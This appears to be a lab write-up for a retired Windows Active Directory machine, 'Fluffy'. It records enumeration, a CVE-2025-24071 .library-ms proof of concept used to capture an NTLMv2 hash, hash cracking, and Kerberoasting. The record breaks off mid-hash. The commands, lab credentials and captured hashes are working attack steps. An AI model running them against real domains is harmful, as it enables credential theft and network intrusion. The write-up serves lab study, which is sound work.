
| Property         | Value                    |
| ---------------- | ------------------------ |
| **OS**           | Windows                  |
| **Difficulty**   | Easy                     |
| **Release Date** | 24th May, 2025           |
| **State**        | Retired                  |
| **Techniques**   | technique-1, technique-2 |
| **Tags**         | #web #privesc #linux     |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

initial creds:

`j.fleischman / J0elTHEM4n1990!`

### Nmap Scan

```
nmap -sC -sV fluffy.htb --open                            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-12 11:52 EDT
Nmap scan report for fluffy.htb (10.129.232.88)
Host is up (0.030s latency).
Not shown: 989 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-12 22:52:57Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-09-12T22:54:17+00:00; +7h00m02s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-09-12T22:54:18+00:00; +7h00m02s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-09-12T22:54:17+00:00; +7h00m02s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-09-12T22:54:18+00:00; +7h00m02s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-12T22:53:41
|_  start_date: N/A
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.10 seconds

```

```
nmap -p- --open fluffy.htb    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-12 11:55 EDT
Nmap scan report for fluffy.htb (10.129.232.88)
Host is up (0.059s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49698/tcp open  unknown
49714/tcp open  unknown
49727/tcp open  unknown
49749/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 204.04 seconds
                                                                                                                
┌──(kali㉿kali)-[~/machines/fluffy]
└─$ nmap -p 9389 -sC -sV --open fluffy.htb 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-12 11:59 EDT
Nmap scan report for fluffy.htb (10.129.232.88)
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
9389/tcp open  mc-nmf  .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds
                                                                     
```

### SMB Enumeration

Shares:

```
nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
```

```
smbclient -U j.fleischman //fluffy.htb/IT --password='J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Sep 12 18:57:28 2026
  ..                                  D        0  Sat Sep 12 18:57:28 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

```

Users:

```
nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users 
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.232.88   445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain
SMB         10.129.232.88   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.232.88   445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account
SMB         10.129.232.88   445    DC01             ca_svc                        2025-04-17 16:07:50 0        
SMB         10.129.232.88   445    DC01             ldap_svc                      2025-04-17 16:17:00 0        
SMB         10.129.232.88   445    DC01             p.agila                       2025-04-18 14:37:08 0        
SMB         10.129.232.88   445    DC01             winrm_svc                     2025-05-18 00:51:16 0        
SMB         10.129.232.88   445    DC01             j.coffey                      2025-04-19 12:09:55 0        
SMB         10.129.232.88   445    DC01             j.fleischman                  2025-05-16 14:46:55 0        
SMB         10.129.232.88   445    DC01             [*] Enumerated 9 local users: FLUFFY
                                                                                         
```

### Bloodhound enumeration

```
sudo bloodhound-python -u 'j.fleischman' -p 'J0elTHEM4n1990!' -ns 10.129.232.88 -d fluffy.htb -c all --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::afbe:3842:e536:2e96
INFO: Trying LDAP connection to dead:beef::afbe:3842:e536:2e96
INFO: Testing resolved hostname connectivity dead:beef::128
INFO: Trying LDAP connection to dead:beef::128
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::afbe:3842:e536:2e96
INFO: Trying LDAP connection to dead:beef::afbe:3842:e536:2e96
INFO: Testing resolved hostname connectivity dead:beef::128
INFO: Trying LDAP connection to dead:beef::128
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20260912120218_bloodhound.zip

```

enumerating the pdf discloses some cve

---
## CVE-2025-24071

Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

poc: https://www.exploit-db.com/exploits/52310

```shell
python3 52310.py -i 10.10.15.80 -n payload1 -o ./output_folder --keep
[*] Generating malicious .library-ms file...
[+] Created ZIP: output_folder/payload1.zip
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.                                                                            
```

```
┌──(kali㉿kali)-[~/machines/fluffy/output_folder]
└─$ ls -la        
total 16
drwxrwxr-x 2 kali kali 4096 Sep 12 12:33 .
drwxrwxr-x 3 kali kali 4096 Sep 12 12:33 ..
-rw-rw-r-- 1 kali kali  364 Sep 12 12:39 payload1.library-ms
-rw-rw-r-- 1 kali kali  323 Sep 12 12:39 payload1.zip
                                                                                                                
┌──(kali㉿kali)-[~/machines/fluffy/output_folder]
└─$ smbclient -U j.fleischman //fluffy.htb/IT --password='J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put payload1.zip
putting file payload1.zip as \payload1.zip (3.3 kB/s) (average 3.3 kB/s)
smb: \> 
smb: \> 

```

```
 sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.80]
    Responder IPv6             [dead:beef:2::114e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-6SEG2CQ7G7H]
    Responder Domain Name      [L6B8.LOCAL]
    Responder DCE-RPC Port     [45330]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                                                                                         

[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:1bf2912eebf812e0:7B8D5180B66A4EF29E90AF01261631BE:010100000000000080C60115B342DD011AD5F376CF6125D500000000020008004C0036004200380001001E00570049004E002D003600530045004700320043005100370047003700480004003400570049004E002D00360053004500470032004300510037004700370048002E004C003600420038002E004C004F00430041004C00030014004C003600420038002E004C004F00430041004C00050014004C003600420038002E004C004F00430041004C000700080080C60115B342DD0106000400020000000800300030000000000000000100000000200000F51BC1D9F8C86B31A73AB278C396E0520A5D92F930533A1E698E2C025A425A470A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380030000000000000000000                                                                                                                                                                                              
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila

```

Cracking the hash:

```
hashcat -m 5600 p.agila.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1469/2939 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1104 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

P.AGILA::FLUFFY:1bf2912eebf812e0:7b8d5180b66a4ef29e90af01261631be:010100000000000080c60115b342dd011ad5f376cf6125d500000000020008004c0036004200380001001e00570049004e002d003600530045004700320043005100370047003700480004003400570049004e002d00360053004500470032004300510037004700370048002e004c003600420038002e004c004f00430041004c00030014004c003600420038002e004c004f00430041004c00050014004c003600420038002e004c004f00430041004c000700080080c60115b342dd0106000400020000000800300030000000000000000100000000200000f51bc1d9f8c86b31a73ab278c396e0520a5d92f930533a1e698e2c025a425a470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00380030000000000000000000:prometheusx-303
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:1bf2912eebf812e0:7b8d5180b66a4ef29e...000000
Time.Started.....: Sat Sep 12 12:45:07 2026 (2 secs)
Time.Estimated...: Sat Sep 12 12:45:09 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1781.5 kH/s (2.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4517888/14344385 (31.50%)
Rejected.........: 0/4517888 (0.00%)
Restore.Point....: 4513792/14344385 (31.47%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: prrprr -> progree
Hardware.Mon.#01.: Util: 69%

Started: Sat Sep 12 12:45:06 2026
Stopped: Sat Sep 12 12:45:11 2026

```

Creds: `p.agila:prometheusx-303`

---
### Lateral Movement

Finding kerberoastable users:

```
sudo ntpdate -b 10.129.232.88 #fix clock skew with ad domain
```

```
GetUserSPNs.py -dc-ip 10.129.232.88 fluffy.htb/p.agila:prometheusx-303 -request
/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20251120.95652.9c2d8b61', 'GetUserSPNs.py')
Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-05-19 11:13:22.188468      
```

```
GetUserSPNs.py -dc-ip 10.129.232.88 fluffy.htb/p.agila:prometheusx-303 -request
/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20251120.95652.9c2d8b61', 'GetUserSPNs.py')
Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-05-19 11:13:22.188468             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$8306fcd312d5adf88c099493cbf81612$43e699b7f286bc9e562f5f7b7efb9f29f158eba6961f2d9611b09101665d050eccbdc94e79f6b706089691dcb228d591c41989d0c6c687e89bf9e9324c25d97652f88074b93a2f9a7bc12eb60237536fa74a97c6d1084ea39be45ee30401bc966039787f62ae5257f25b4a42a43c2f970141820944b6673518453e8907ef1118a24b46f8d4c51bcc5e1ced09174a216e0b12674676ae18299f391bb50a10daa9e4dc2b6a418cd3ce1ae1f7db960810f2cc9a2ed453fb2e58d3e24f2ac18453c95602317e1d795b1925254656eab8936ee3c77264ffd9bfe688b85749f4cf8b0a02f71b36a46d4e7c95e8f5c9b2b4f0da84db93e2e164e625786e25d1e4ec5cbd4bab7669d2a181227eeb2bde962fcf49e0f8e03e2ac9f84d03c3db9350f4fdc1090f374813965d9fa4bdb3b622cd494851e11dfd8eb524e46c3cf412a6d54d67d071d2112e9dcc02ba9aea25455a9a1cf13af6e120ffa2b1a4907d66dee23f64e318b130eea3b49b541ed687f0edfab03e1762f1139585d4fe7d79e759f71214cde14f74173d0de95f7700a46a0c371fdebadafeb7c3948b315e1aa1c1fbafc319cd14a8dbc09602d30e35b8838d693ad22802146abe2eb2096f095c67d1d21cbac2e37dbad9556a63c97d7c31fd71be147cfa7a7676b044c5c63caa8c8c7b1b9ace4d52581200945994171aa550344fadc44d8f779d6806e769cc54a2a3e4df63bfeaaf40b55b7e17b4ac0fa00a78da79d07026c5ab43feca6144589d1160d2bfa85312d6b3528bb662bad6109871cfd5f532880e41ca4d7560fbb88b2ffac80cfcd1898ec91059dcadd0166db09e24c06a2610017ab54c1816cf3ddd8dd53c7fd87aac3bb6946f11077a20b2fe142414a166f72d23e41710bf15cf5f63aef5b3502b918f121f954b1a81d9f4605c242424506a7a081831226506b9c7b88dca108102f87595f59d190071efd2fd66e59dd91e6fd688fd828efadf3eac4c2f9cd51db408e98d23045f7d007ecbc7c937ac4b221303dda3857c13e116619b3445e058c679a801f989c190b25933543bb17cf2ecfef9c9b46956efb1ae1e74b5b930caeab975ad58bcedaf209d1ab637b1d32d3f49e611e14cf7bf621f4635acb19f70ea71ca498e81cbd79ea04b097e02048803c4a87426cee5730a1262439104380d9192738a54733291a021d8626f920438dd2f12d0f904610390d995732e3ea6a84d98cd5bc2ab447c9537645432e40999c3a60710766378080b872514f83e9cabc968da3ed2cb0d4201053cc50f57bc5341dd44827a22b5cdb7c1149bb2158f82711bc2118013d5fa6deba0deaff5458083a97b380accc5fbede4808336005aa83ca43e27a6e024200c886d88ceea1492788cc01f6097125030bb210528731b0668ca0f191ec21731062d392283f77517ca56b6a756546c621cf7e6f571814562aeaf17d49bc202527e0ef753354dc5419e9f9180fbd66f796233919f95850412
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$1d77710ca2678916c7589ccbd3a5fa79$b192b3f88a75e7e15fb33ee17cb39ed404d04bdf4b7e633f18bb7ef847f2701e62a7204ea5fdc854310e63de8f3a1e4f2add17383e24f928e590b4d08cc5af204905a2e6820b33424705141f7b2fe493eb8454da9db554b8aae7c86f598c17374a3986cc7fac1ee95d5a03ca998fac78c2e0516c71424803c3a849f98e003a6743dc83b0dabb535dbb323a910cf966c5a9fc79795313f7cbe77fadab007295bf1c888975ebdcc9b0c76a9c842a1f068b36b25c50418443a87714c6e272ccb2543976ec76843bb1341fd51fa0a52d631160c35e325812fa105a8599f9fa52410f6437628e5daeedf08ea81ff095dfa7ba4100feb9a7ec91576131a4d8f81502e3754fad4e5222b6fe326fbc473c028d0b1ce048b991a164eb909df2c0c8ec5fff223e16431373508969d64aa1b4c1c749aa915fa8b3d5c66cec571724d5e2e6a8246f04d92b60fb562ab60344a85dbbb12c07f18939b520db7eff6e214c0b7ce380ed17c94b27f2d8339a72bf91c534a9f2c9e42712396a24cb2aff5d4ef8c33b6b4ad0edd414b1cee051e192c3df9084b601698049c4794068da1286fa0ee9a563ed51784dbd51154c417e6f7bd56b5410cbf02681c6c20eaae5ca3c4214da9ea3b0bf8a324c87d6f3cecf39c8011b16928b25bfe3769432bee4f0db8d7744bc8bbafd81c3f0345c50a1a19d3c869bc67cd50893f41c1e5419ceb72fbf90212b70ddb863fb241ce5b786268c16a2289cdb36256957d9e924a32780fdf613a51342a9adc39c67a667f755c6617beecdf98e9f42b95b5b207832d9ff079440ac65f2a19a590036d8bc8b4929b588121d3607390ef439e5a175ac96d2993ce8e4efab724cf1f61d062e0d77b6b168a52bf3f50238b16ffb98208d34167b334f9e8e0d0ad05747365f20871be75df82232ff5ff673aaf3d5a4135dfa22c7ddf713459696065c5332d46a596879f1b8e4d31d749aa6cf00ba20ad6512ccb3a50ce23efeb6eb968fef7a8cda345b907fcb01e47ad2bc3a50dc5e2662af33626949fe680023782dc7502000db89f56779f1839e36f1c1fcd60717edb51723c55a81c2fb44eeb2643e77602b559cec9057131fb1fb7b94113c1c92e83e7e86d15c9b9dc4f7d739a75c2c45d81b27bd6fec187fdb7acd5f40791580089da1e00d608c6a0bd0794c03a967eb6362684ae4f0860873041b98a1f193ebc5191132460b55ae4e3944bafb35bb866a31169802a60671d282d4fb08a61c25bc3570a8b042da36fd08ec3e4533fbaf73d12802fd529f943061765f20d40dd9d6e421cc69efc4dd91a07312120c3b02376404b3dda9768edae52d1e34b2fc5f5b0684eb32bd839b669283ef09e786fd1d016e939a751e50f3826a8c683216de6a9022d2cf476e453e9277632e200fa7d2ed877046e66387cac36b35a1708b7e51ab5c656b6055b4a7ab1d10473e2a2222d36f559643ed02f90821c11430a9b524738f6ea1331952347247
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$c779cea864006d48ea9a80db5c100226$bec48edb401079d9c25dd55a5eb966ae6f58e31fff313e7f7da3e2227e7f4918c8c2440765f80e5cf4c2bc5a2e09d0825ae9dadf58257f8b15d96eb36592edce084c84e5e15823b57f85d8e94ff049fcb863fb8221019d6615d30bb5e9a0d85f6ee39d20951791151030a4cc3fbeae53241485ba6b2330e12de9afe5d83f38a95c05c405a44eadfac44c0776993f6ced1d6ad19244032d9eed75615293d13b4344937be0e0f124fa323b9169c496c394308c6f5e06ee6110cf83ad0f5edd67b54ef6c8c0b351d55b272200992443545e70a54d0ed6272d1455403cfd14be3eb6ac988e243a0e40d9ef9ecafa14edad1b809b2894384ce6858f97903d2db7efca1bf224dabd4d368977bb87608bbd76599fc343bfe5f5103a0c61e45b3c0cf6d371a579070a969ca23e0c705f1fb43c405982ecb96da7fb950ac305587655622a14db7dd0a471d8b78436fbd6879768ac8f218bc1b0ab87cea099cfeb63dc37ea209b02810655d771c9765ce9400878900381ec503a2f4b88c077ea3ffdb3d8fc3d1ca7399999c918435d6400eba9b0d4fc865e26157cbdf15ebca54cbe10245dfdd12382f7a673ffb2243510209164cd3e856a9ebf8f327f0d474a48427692fddc75a2548f4713da28997db6e3796ae6f35f0597b15e9ad3c5c69390606e1259d0c7d2a6bb109ef2c6aab9ba44c8517b6450b4101cb958ad2116c4d3d60ca998b1f9b3f444217e13da1e1cdba9acc2479df5dc7b3efed6452b59c70dd3728fbdce3bfd160851c4bffe525038c08841cef23993b8abe88adbde6d70c348c8eb773720d24ea15e36f8554593fcabdff89794b70b8fcaf0f9680e2c77a8ffaec86eb5eda14daafc589b07f27206deb15572591875ec8159bd8ea4e0825af6008350805c4e931b999539214db47d071d9a1e8131f52309092cd0ad77fb7e93e9229b96970b9088f4cac64b31cbea0a89fabd1aaaf53f4c2b37718f77931bbd78628192b715aafd130bca854a01aba8144355115a95b93adb3c580d39021c7e8826db5c0f32bdebb433aa1c39b11ab3baccc29e2631a7fa0ea01d8d34d15f3f98698e3ce0d95e9284995091aa1f809e99ffd44351243f2c716066622bf4d60daa1d9a038fba4b303822ef825ac90a2759cdd65dc05bb09b455f7709b2724d214c61bffe843eae87af5e23d9f512ede1b553f1c61f2b7ebc7a6801b4a91bed3228d2fcde81f0f6c9965560b0ca0212d662795499b788297485409dd2e9f1aeaad87e61cc4b99d2171e21ced97e2c187c3ddcde088c241ef9c1af3ebcd663e84c24b7794dc2a31633eeec0a710f08997b907f13e3aea49c611f165233095455fc80505e95374a19215b45e4375ca3ed38c8ce82028a956a890221de56efae88d4bd48e4153d1255166092168af9761f32574f83222b4421e0918a77ca4615de9477fd750ca75519c4637ee3b3562bedd290413f54afdc8fcb09079a4e04f9cddfd954e4bce3
```

Hashes did not crack

bloodhound images

```
 net rpc group addmem "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S 10.129.232.88
```

```
python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ca_svc)
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$f87ff51c5d0e3621d503efd9971563b2$53fccc60b18d364c4fd44b2cab863efa9a677b25ee1ac563b6867fb44546a8c842628acfc792fa1299314f21b835c4967b180dd8eb3c32579222a8218b003265f46fa7634abf5cd4a31acd5db018957ea8c8223e5e42241f9065f7ca23b34eabb6ee4f9af8c76cdf7a966a1fe20f8bd63e370041ee75a2e59ce753ad0999448bd12fec8306402f7b896a40f5de7f0961a946cc8a7b3736838946c839f4126c8e12788068018064029a4d979b3948d1dd6f608d99e9a1be37d7e9acf8e1d2af335061348d0366bcce3ef63b1df71919c662d6c5f27b2c8faaf007e2c44992500bb96d327b572ef1fd1dd51039a3d0cc8a3b4350f051e0d1932c136e06126729c97403285924877c4976286be3be46ab60e0acfb1742f2f1f9d66e1fdcd1f1610bf358e5d922c5e834edcb4178c75012d53ee100d942124f71a6453bd04da8dd22e0c008d4d33f56df7cc987d666c4a0ba260c968d68a174086b37a6cf8d70723869ded48a4e8c6be68501d7d5882d87750a6f22550c44843409306170c7f2d334e17aa29a3fba1fadb757e2d21a84efc0850fc54383d033a66e7838546f1ca37348875f38e077ead6c1d8bc0e07757741f34f100fb4539555324748abb46902fc46510112b5bcc0f0847a67c248f181017768e3bd5632dcd7475d828e9f3d3827b1ad053247cb1353c612b80c594d4d394d861f8ceab36f60a111a368dff92c0b7ce2a5ea1af5d9199b4f36b1ed91d969419d817464d51c641d3bec9e74335424b604d308ae4d3921dad59d6b34dd8f263b4986d5851bf6ffa6ac087ce6fe87028c21cc5048c726f952d2c24bf2d54d4296dc805d414806bd80cd63241b6733d57e1754880da1950c93bf2f6c255f0cc4eb1267d9a10e7eeb535ac0d493770f62ec5a713301720462fe99f4fb43199292cdee40c96a949c945276187b38b446d03867a76a882c5a2afe6a4aafd66dd6a06b8cb72f00138e4d12a218057655a3a698304f63946854ff9228008bbb248613c8a5536d1c50091fc17d06367be767a0cab3a6ad1eefd5958d98dfd2949ec3ac91176ddfc7946be3f2fba63f34ef8f035c25354db895ce900d683ef0b1a00e707b4843cdf5e0ec837c4fce0085a724ff554e82773804199e40cca6d8ddd3e00a97efe287e8129d3c1504797fd6e084fdd2489871248967bc2db9a1337